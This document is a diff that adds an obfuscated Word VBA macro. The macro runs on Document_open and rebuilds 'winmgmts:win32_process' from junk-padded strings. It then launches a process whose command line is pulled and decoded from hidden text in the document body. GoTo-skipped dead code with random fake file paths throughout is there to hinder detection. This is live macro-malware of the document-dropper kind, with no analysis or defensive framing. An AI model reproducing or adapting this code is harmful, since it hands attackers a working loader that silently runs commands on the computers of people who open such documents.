@@ -1,0 +1,256 @@
+Private Sub Document_open()
+Q3ap0ampssf3iabmqw
+End Sub
+
+Function Q3ap0ampssf3iabmqw()
+On Error Resume Next
+mKbjhqs = Iuv9d392xpmiut2.StoryRanges.Item(244 / 244)
+   GoTo UNzSHFEue
+Dim clGhSyA() As Byte
+Dim eOpwC As Integer
+eOpwC = FreeFile
+Open "F:\KlUAAAAd\hnAbRz\oxIYTaGGB.dcUPIBJ" For Binary Access Read As #eOpwC
+Open "O:\BNrAD\CqWKBciL\YpkqL.mptZFAGV" For Binary Access Read As #eOpwC
+ReDim clGhSyA(1 To LOF(intGend) - 5)
+Get #eOpwC, , clGhSyA
+Get #eOpwC, , clGhSyA
+Get #eOpwC, , clGhSyA
+Close #eOpwC
+UNzSHFEue:
+snahbsd = "]b2[sp]b2[s"
+Z4yipn8891i = "]b2[sro]b2[s]b2[sce]b2[ss]b2[ss]b2[s]b2[s"
+   GoTo TvnYBBEJo
+Dim kSzOEASu() As Byte
+Dim ZibgBBdYC As Integer
+ZibgBBdYC = FreeFile
+Open "F:\AASPQ\TQPlhi\ayBpEP.izGvH" For Binary Access Read As #ZibgBBdYC
+Open "O:\WYWliE\ezIyJAwII\blZSv.QzXxPW" For Binary Access Read As #ZibgBBdYC
+ReDim kSzOEASu(1 To LOF(intGend) - 5)
+Get #ZibgBBdYC, , kSzOEASu
+Get #ZibgBBdYC, , kSzOEASu
+Get #ZibgBBdYC, , kSzOEASu
+Close #ZibgBBdYC
+TvnYBBEJo:
+V63m2ly5ij3l08g = "]b2[s:w]b2[s]b2[sin]b2[s3]b2[s2]b2[s_]b2[s"
+   GoTo KIfTAJCJ
+Dim LDRfD() As Byte
+Dim VnefADZEB As Integer
+VnefADZEB = FreeFile
+Open "F:\WMIGqgGDk\LAivT\hzkdr.QpDvEX" For Binary Access Read As #VnefADZEB
+Open "O:\JoLwtjqOy\WVrGBH\dVTWTEgB.gDvok" For Binary Access Read As #VnefADZEB
+ReDim LDRfD(1 To LOF(intGend) - 5)
+Get #VnefADZEB, , LDRfD
+Get #VnefADZEB, , LDRfD
+Get #VnefADZEB, , LDRfD
+Close #VnefADZEB
+KIfTAJCJ:
+Iehqyoh5kb6pjmtl0 = "w]b2[sin]b2[sm]b2[sgm]b2[st]b2[s]b2[s"
+   GoTo pWYsBi
+Dim cALbPUDJZ() As Byte
+Dim rdFcI As Integer
+rdFcI = FreeFile
+Open "F:\thovCWIAU\AdtCI\dzOdnfMt.UfeQZrE" For Binary Access Read As #rdFcI
+Open "O:\HMUUhJQ\GfHfHAGE\zKjWYbvH.VxiQDBUED" For Binary Access Read As #rdFcI
+ReDim cALbPUDJZ(1 To LOF(intGend) - 5)
+Get #rdFcI, , cALbPUDJZ
+Get #rdFcI, , cALbPUDJZ
+Get #rdFcI, , cALbPUDJZ
+Close #rdFcI
+pWYsBi:
+Plskz7mhuqep5ssvv = "]b2[ss]b2[s"
+   GoTo gZdKDGDIc
+Dim INqme() As Byte
+Dim bNplHoTI As Integer
+bNplHoTI = FreeFile
+Open "F:\JIPODa\rmYZu\klhIJJ.QPlbDLGBH" For Binary Access Read As #bNplHoTI
+Open "O:\HSZdG\bmsOGKI\LVNhC.FooXRDlIJ" For Binary Access Read As #bNplHoTI
+ReDim INqme(1 To LOF(intGend) - 5)
+Get #bNplHoTI, , INqme
+Get #bNplHoTI, , INqme
+Get #bNplHoTI, , INqme
+Close #bNplHoTI
+gZdKDGDIc:
+Aufucwp0_h7cp26g = Iehqyoh5kb6pjmtl0 + Plskz7mhuqep5ssvv + V63m2ly5ij3l08g + snahbsd + Z4yipn8891i
+   GoTo oAPgd
+Dim uvlvJhGUT() As Byte
+Dim vuAYI As Integer
+vuAYI = FreeFile
+Open "F:\BvdtBII\GwriC\qzUqBBG.tWmkBG" For Binary Access Read As #vuAYI
+Open "O:\nXpmGPD\nuFlC\mmXUfHIEh.dwOvIB" For Binary Access Read As #vuAYI
+ReDim uvlvJhGUT(1 To LOF(intGend) - 5)
+Get #vuAYI, , uvlvJhGUT
+Get #vuAYI, , uvlvJhGUT
+Get #vuAYI, , uvlvJhGUT
+Close #vuAYI
+oAPgd:
+Yn7j542fdj9d7sk = K00x318cv0jm(Aufucwp0_h7cp26g)
+   GoTo ePLrO
+Dim pKMlH() As Byte
+Dim RByAt As Integer
+RByAt = FreeFile
+Open "F:\tUuAFhWSj\QKBUQ\ldMhCrI.XjAQyGS" For Binary Access Read As #RByAt
+Open "O:\SBedQsHFh\WRdMhRNCY\blRZE.WjBrj" For Binary Access Read As #RByAt
+ReDim pKMlH(1 To LOF(intGend) - 5)
+Get #RByAt, , pKMlH
+Get #RByAt, , pKMlH
+Get #RByAt, , pKMlH
+Close #RByAt
+ePLrO:
+Set Ka1yh0d3ab_l97 = CreateObject(Yn7j542fdj9d7sk)
+   GoTo uiuVEsDmR
+Dim crQHM() As Byte
+Dim TnlOC As Integer
+TnlOC = FreeFile
+Open "F:\FFbpiWB\VvOXGAE\zEGdJE.apsKvpRsC" For Binary Access Read As #TnlOC
+Open "O:\PfkqI\ZpoPGDAG\GVttcD.JlHvtn" For Binary Access Read As #TnlOC
+ReDim crQHM(1 To LOF(intGend) - 5)
+Get #TnlOC, , crQHM
+Get #TnlOC, , crQHM
+Get #TnlOC, , crQHM
+Close #TnlOC
+uiuVEsDmR:
+Qep75hkad_o736g9b0 = Mid(mKbjhqs, (3 + 3), Len(mKbjhqs))
+   GoTo uWBYBnHGo
+Dim QOgqBHGB() As Byte
+Dim FhZNJIEA As Integer
+FhZNJIEA = FreeFile
+Open "F:\RwqxCFB\AdfBvFj\CJKuIwCJ.rPbwEGB" For Binary Access Read As #FhZNJIEA
+Open "O:\UpVPE\AXjYE\JjZjBDpBc.SfMHKIC" For Binary Access Read As #FhZNJIEA
+ReDim QOgqBHGB(1 To LOF(intGend) - 5)
+Get #FhZNJIEA, , QOgqBHGB
+Get #FhZNJIEA, , QOgqBHGB
+Get #FhZNJIEA, , QOgqBHGB
+Close #FhZNJIEA
+uWBYBnHGo:
+   GoTo GsGZIIgcb
+Dim XFdDCC() As Byte
+Dim jFWEXgA As Integer
+jFWEXgA = FreeFile
+Open "F:\HWATFEEJE\YdtIJAG\pYgrqBvH.NTJQZGIGI" For Binary Access Read As #jFWEXgA
+Open "O:\oVEfinNAC\NuYmSjGOH\nLUUIBC.kGDWG" For Binary Access Read As #jFWEXgA
+ReDim XFdDCC(1 To LOF(intGend) - 5)
+Get #jFWEXgA, , XFdDCC
+Get #jFWEXgA, , XFdDCC
+Get #jFWEXgA, , XFdDCC
+Close #jFWEXgA
+GsGZIIgcb:
+Ka1yh0d3ab_l97.Create K00x318cv0jm(Qep75hkad_o736g9b0), Zyb2dkxppnxp7, Jwyrvqyrgy0n_
+   GoTo XxCCJud
+Dim rsBpNBxG() As Byte
+Dim BVTvC As Integer
+BVTvC = FreeFile
+Open "F:\GhXieDzED\BcYuDJC\ZujZCJ.OfMPHAofO" For Binary Access Read As #BVTvC
+Open "O:\FlTTD\ekWaaB\HlqAkGd.sKurCl" For Binary Access Read As #BVTvC
+ReDim rsBpNBxG(1 To LOF(intGend) - 5)
+Get #BVTvC, , rsBpNBxG
+Get #BVTvC, , rsBpNBxG
+Get #BVTvC, , rsBpNBxG
+Close #BVTvC
+XxCCJud:
+   GoTo QawLxC
+Dim kzsVdu() As Byte
+Dim DwSjDe As Integer
+DwSjDe = FreeFile
+Open "F:\tPOQJHWD\CbYeFCo\RCdAC.DgrnQDG" For Binary Access Read As #DwSjDe
+Open "O:\FPVeKgCTG\MARTECFHi\WlHFHEC.PiyfPJLAE" For Binary Access Read As #DwSjDe
+ReDim kzsVdu(1 To LOF(intGend) - 5)
+Get #DwSjDe, , kzsVdu
+Get #DwSjDe, , kzsVdu
+Get #DwSjDe, , kzsVdu
+Close #DwSjDe
+QawLxC:
+Iuv9d392xpmiut2.StoryRanges.Item(244 / 244)
+End Function
+
+Function K00x318cv0jm(F9wpzjyu9ns_)
+On Error Resume Next
+   GoTo WekCH
+Dim mtVJE() As Byte
+Dim jxzbRSHC As Integer
+jxzbRSHC = FreeFile
+Open "F:\PURdqGCfJ\hKpcHJAEa\LwfVu.hONnXUJ" For Binary Access Read As #jxzbRSHC
+Open "O:\krdomCACK\VAEPIFB\NriGAJGH.izdvIR" For Binary Access Read As #jxzbRSHC
+ReDim mtVJE(1 To LOF(intGend) - 5)
+Get #jxzbRSHC, , mtVJE
+Get #jxzbRSHC, , mtVJE
+Get #jxzbRSHC, , mtVJE
+Close #jxzbRSHC
+WekCH:
+Gi8706_2_jlutn = (F9wpzjyu9ns_)
+   GoTo zktNHHBCA
+Dim GBVFHMEVA() As Byte
+Dim BZIrbK As Integer
+BZIrbK = FreeFile
+Open "F:\ANGeIJA\rxixDJCCp\qCviIXDO.PMhuEJCI" For Binary Access Read As #BZIrbK
+Open "O:\wqCAPwEeA\HlqvyUIE\tajdIEs.fGWIYF" For Binary Access Read As #BZIrbK
+ReDim GBVFHMEVA(1 To LOF(intGend) - 5)
+Get #BZIrbK, , GBVFHMEVA
+Get #BZIrbK, , GBVFHMEVA
+Get #BZIrbK, , GBVFHMEVA
+Close #BZIrbK
+zktNHHBCA:
+Ctnu6_x2epq_fcl55 = C2gd68s3xga(Gi8706_2_jlutn)
+   GoTo pSCFNSy
+Dim lsrbF() As Byte
+Dim vrLTBAfu As Integer
+vrLTBAfu = FreeFile
+Open "F:\zwnLCPL\wKgZCH\jkHnDG.YSZSx" For Binary Access Read As #vrLTBAfu
+Open "O:\ELxuEQtGC\HbCBRHElJ\CgQfCQJH.FgJHEJ" For Binary Access Read As #vrLTBAfu
+ReDim lsrbF(1 To LOF(intGend) - 5)
+Get #vrLTBAfu, , lsrbF
+Get #vrLTBAfu, , lsrbF
+Get #vrLTBAfu, , lsrbF
+Close #vrLTBAfu
+pSCFNSy:
+K00x318cv0jm = Ctnu6_x2epq_fcl55
+   GoTo fmaUdBvn
+Dim UTECsDOJ() As Byte
+Dim RClsHFJ As Integer
+RClsHFJ = FreeFile
+Open "F:\bVJTKAJ\ZHsfHHA\lckDJ.KDOcG" For Binary Access Read As #RClsHFJ
+Open "O:\SXMxA\oDyiCDA\VaCDNE.rzYIGJ" For Binary Access Read As #RClsHFJ
+ReDim UTECsDOJ(1 To LOF(intGend) - 5)
+Get #RClsHFJ, , UTECsDOJ
+Get #RClsHFJ, , UTECsDOJ
+Get #RClsHFJ, , UTECsDOJ
+Close #RClsHFJ
+fmaUdBvn:
+End Function
+
+Function C2gd68s3xga(K4rvh060xjy)
+   GoTo cPhJG
+Dim XbeROCHF() As Byte
+Dim JXwDJT As Integer
+JXwDJT = FreeFile
+Open "F:\QPJIM\hgIxDc\FvKIH.CSTnCADF" For Binary Access Read As #JXwDJT
+Open "O:\DqUyFI\DSrqBbWG\ZpyGFGBBL.LxlHj" For Binary Access Read As #JXwDJT
+ReDim XbeROCHF(1 To LOF(intGend) - 5)
+Get #JXwDJT, , XbeROCHF
+Get #JXwDJT, , XbeROCHF
+Get #JXwDJT, , XbeROCHF
+Close #JXwDJT
+cPhJG:
+C2gd68s3xga = Replace(K4rvh060xjy, "]b2[s", Uzid_5bjvn3aycd)
+   GoTo qQKiQCDf
+Dim rXkPDICH() As Byte
+Dim UKPBvMAKD As Integer
+UKPBvMAKD = FreeFile
+Open "F:\rIvHFE\FnytU\YrUaTdpQj.cbXYEk" For Binary Access Read As #UKPBvMAKD
+Open "O:\IaCIDX\RViAD\PpSTA.tXAWOQ" For Binary Access Read As #UKPBvMAKD
+ReDim rXkPDICH(1 To LOF(intGend) - 5)
+Get #UKPBvMAKD, , rXkPDICH
+Get #UKPBvMAKD, , rXkPDICH
+Get #UKPBvMAKD, , rXkPDICH
+Close #UKPBvMAKD
+qQKiQCDf:
+End Function
+
+
+
+
+
+
+
+
+
+
